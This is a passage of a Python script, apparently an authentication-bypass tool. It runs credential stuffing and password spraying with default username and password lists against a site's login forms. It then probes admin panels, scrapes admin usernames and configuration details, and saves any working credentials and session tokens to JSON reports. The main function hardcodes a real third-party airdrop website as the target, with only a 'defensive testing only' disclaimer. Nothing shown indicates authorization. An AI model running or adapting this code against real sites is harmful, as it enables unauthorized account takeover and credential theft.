            ("root", "root"),
            ("root", "password"),
            ("admin", "admin123"),
            ("admin", "password123"),
            ("administrator", "admin123")
        ]

        # Test against login endpoints
        login_endpoints = [e for e in self.discovered_endpoints if "login" in e["endpoint"].lower()]

        if login_endpoints:
            for login_endpoint in login_endpoints:
                await self.test_credential_stuffing(login_endpoint, credential_pairs)

    async def test_credential_stuffing(self, endpoint_data: Dict, credential_pairs: List[Tuple]):
        """Test credential stuffing"""
        endpoint = endpoint_data["endpoint"]
        forms = endpoint_data.get("forms", [])

        for form in forms:
            if form["method"].upper() == "POST":
                username_field = None
                password_field = None

                # Identify fields
                for input_field in form["inputs"]:
                    field_name = input_field["name"].lower()
                    if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                        username_field = input_field["name"]
                    elif "pass" in field_name:
                        password_field = input_field["name"]

                if username_field and password_field:
                    for username, password in credential_pairs:
                        try:
                            form_data = {
                                username_field: username,
                                password_field: password
                            }

                            # Add other fields
                            for input_field in form["inputs"]:
                                field_name = input_field["name"]
                                if field_name not in [username_field, password_field]:
                                    form_data[field_name] = "test"

                            url = urljoin(self.target_url, form["action"] or endpoint)
                            response = self.session.post(url, data=form_data, timeout=10)

                            if self.detect_successful_login(response):
                                self.valid_credentials.append({
                                    "type": "credential_stuffing",
                                    "username": username,
                                    "password": password,
                                    "endpoint": endpoint
                                })
                                self.access_gained = True
                                print(f"🚨 Valid credentials via stuffing: {username}:{password}")

                        except Exception:
                            continue

    async def password_spraying(self):
        """Password spraying attack"""
        print("\n🌫️ Password Spraying")

        # Common passwords to test
        passwords = [
            "admin", "password", "123456", "12345678", "root", "admin123",
            "password123", "test123", "demo123", "guest123"
        ]

        # Test against multiple usernames
        usernames = ["admin", "administrator", "root", "user", "test"]

        login_endpoints = [e for e in self.discovered_endpoints if "login" in e["endpoint"].lower()]

        if login_endpoints:
            for login_endpoint in login_endpoints[:1]:  # Test first login endpoint
                await self.test_password_spraying(login_endpoint, usernames, passwords)

    async def test_password_spraying(self, endpoint_data: Dict, usernames: List[str], passwords: List[str]):
        """Test password spraying"""
        endpoint = endpoint_data["endpoint"]
        forms = endpoint_data.get("forms", [])

        for form in forms:
            if form["method"].upper() == "POST":
                username_field = None
                password_field = None

                # Identify fields
                for input_field in form["inputs"]:
                    field_name = input_field["name"].lower()
                    if any(keyword in field_name for keyword in ["user", "login", "email", "name"]):
                        username_field = input_field["name"]
                    elif "pass" in field_name:
                        password_field = input_field["name"]

                if username_field and password_field:
                    # Try each password with different usernames
                    for password in passwords:
                        for username in usernames:
                            try:
                                form_data = {
                                    username_field: username,
                                    password_field: password
                                }

                                # Add other fields
                                for input_field in form["inputs"]:
                                    field_name = input_field["name"]
                                    if field_name not in [username_field, password_field]:
                                        form_data[field_name] = "test"

                                url = urljoin(self.target_url, form["action"] or endpoint)
                                response = self.session.post(url, data=form_data, timeout=10)

                                if self.detect_successful_login(response):
                                    self.valid_credentials.append({
                                        "type": "password_spraying",
                                        "username": username,
                                        "password": password,
                                        "endpoint": endpoint
                                    })
                                    self.access_gained = True
                                    print(f"🚨 Valid credentials via spraying: {username}:{password}")

                            except Exception:
                                continue

    async def access_verification_phase(self):
        """Fase 5: Access Verification"""
        print("\n🔍 Phase 5: Access Verification")
        print("-" * 50)

        # Verify credentials found
        await self.verify_credentials()

        # Test admin access
        await self.test_admin_access()

        # Document successful access
        await self.document_access()

    async def verify_credentials(self):
        """Verify credentials found"""
        print("\n🔑 Verifying Credentials")

        if self.valid_credentials:
            print(f"📊 Found {len(self.valid_credentials)} potential valid credentials")

            for i, cred in enumerate(self.valid_credentials[:5]):  # Test first 5
                print(f"🔍 Testing credential {i+1}/{len(self.valid_credentials)}")

                # Try to access protected endpoints with these credentials
                endpoints = ["/admin", "/dashboard", "/settings", "/profile"]

                for endpoint in endpoints:
                    try:
                        # Try to access with current session (if authenticated)
                        response = self.session.get(urljoin(self.target_url, endpoint), timeout=10)

                        if self.detect_admin_access(response):
                            print(f"✅ Verified access to {endpoint} with credential: {cred}")

                            # Add detailed access information
                            cred["verified_endpoints"] = [endpoint]
                            cred["verified"] = True

                    except Exception:
                        continue

        else:
            print("❌ No valid credentials found")

    async def test_admin_access(self):
        """Test admin access with found credentials"""
        print("\n👤 Testing Admin Access")

        if not self.valid_credentials:
            print("❌ No credentials to test")
            return

        # Try various admin endpoints
        admin_endpoints = [
            "/admin", "/administrator", "/admin panel", "/admin/login",
            "/wp-admin", "/cpanel", "/phpmyadmin", "/admin/dashboard",
            "/admin/settings", "/admin/users", "/admin/config"
        ]

        for cred in self.valid_credentials:
            if "verified" in cred:
                for endpoint in admin_endpoints:
                    try:
                        response = self.session.get(urljoin(self.target_url, endpoint), timeout=10)

                        if response.status_code == 200 and self.detect_admin_content(response.text):
                            print(f"🚨 Admin access confirmed at {endpoint}")
                            cred["admin_access"] = [endpoint]

                            # Try to extract admin information
                            await self.extract_admin_info(response, endpoint)

                    except Exception:
                        continue

    def detect_admin_content(self, content: str) -> bool:
        """Detect if content is from admin panel"""
        content_lower = content.lower()

        admin_indicators = [
            'admin panel', 'administrator', 'dashboard', 'control panel',
            'system admin', 'admin settings', 'user management',
            'configuration', 'server administration', 'web administration'
        ]

        return any(indicator in content_lower for indicator in admin_indicators)

    async def extract_admin_info(self, response, endpoint: str):
        """Extract admin panel information"""
        content = response.text

        # Extract possible usernames from admin panel
        username_patterns = [
            r'>([^<]+)</td>\s*</tr>\s*<tr>\s*<td[^>]*>Username',
            r'Username[^>]*>([^<]+)',
            r'Logged in as[^>]*>([^<]+)',
            r'Welcome[^>]*>([^<]+)'
        ]

        for pattern in username_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 2:  # Likely a username
                    print(f"👤 Extracted admin username: {match}")

        # Extract configuration information
        config_patterns = [
            r'Database[^>]*>([^<]+)',
            r'Host[^>]*>([^<]+)',
            r'Version[^>]*>([^<]+)',
            r'Server[^>]*>([^<]+)'
        ]

        for pattern in config_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                print(f"⚙️ Extracted config info: {match}")

    async def document_access(self):
        """Document successful access"""
        print("\n📄 Documenting Access")

        if self.valid_credentials or self.access_gained:
            access_summary = {
                "target": self.target_url,
                "timestamp": datetime.now().isoformat(),
                "access_gained": self.access_gained,
                "valid_credentials": self.valid_credentials,
                "session_tokens": self.session_tokens,
                "vulnerabilities_found": self.vulnerabilities_found,
                "discovered_endpoints": self.discovered_endpoints,
                "access_methods": []
            }

            # Document access methods
            if self.valid_credentials:
                access_summary["access_methods"].append("credential_based")

            if self.session_tokens:
                access_summary["access_methods"].append("session_based")

            if self.vulnerabilities_found:
                access_summary["access_methods"].append("vulnerability_exploit")

            # Save access documentation
            filename = f"authentication_bypass_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(access_summary, f, indent=2)

            print(f"📊 Access documentation saved to: {filename}")

        else:
            print("❌ No access gained")

    async def generate_bypass_report(self):
        """Generate comprehensive bypass report"""
        print("\n📋 Generating Bypass Report")

        report = {
            "scan_info": {
                "target_url": self.target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Advanced Authentication Bypass",
                "scan_duration": "30-60 detik"
            },
            "summary": {
                "total_endpoints_discovered": len(self.discovered_endpoints),
                "total_vulnerabilities_found": len(self.vulnerabilities_found),
                "valid_credentials_found": len(self.valid_credentials),
                "session_tokens_extracted": len(self.session_tokens),
                "access_gained": self.access_gained,
                "risk_level": "Critical" if self.access_gained else "High"
            },
            "vulnerabilities": self.vulnerabilities_found,
            "credentials": self.valid_credentials,
            "sessions": self.session_tokens,
            "endpoints": self.discovered_endpoints,
            "recommendations": [
                "Implement proper authentication mechanisms",
                "Use parameterized queries to prevent SQL injection",
                "Implement rate limiting to prevent brute force attacks",
                "Use secure session management",
                "Implement proper input validation",
                "Use prepared statements for database operations",
                "Implement proper error handling",
                "Use Web Application Firewall (WAF)"
            ]
        }

        # Save detailed report
        filename = f"advanced_authentication_bypass_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"📊 Detailed report saved to: {filename}")

async def main():
    """Main execution function"""
    target_url = "https://airdrop.0gfoundation.ai"

    print("🔐 Advanced Authentication Bypass Scanner")
    print("=" * 70)
    print(f"🎯 Target: {target_url}")
    print("=" * 70)
    print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
    print("=" * 70)

    bypass = AdvancedAuthenticationBypass(target_url)
    await bypass.execute_bypass()

if __name__ == "__main__":
    asyncio.run(main())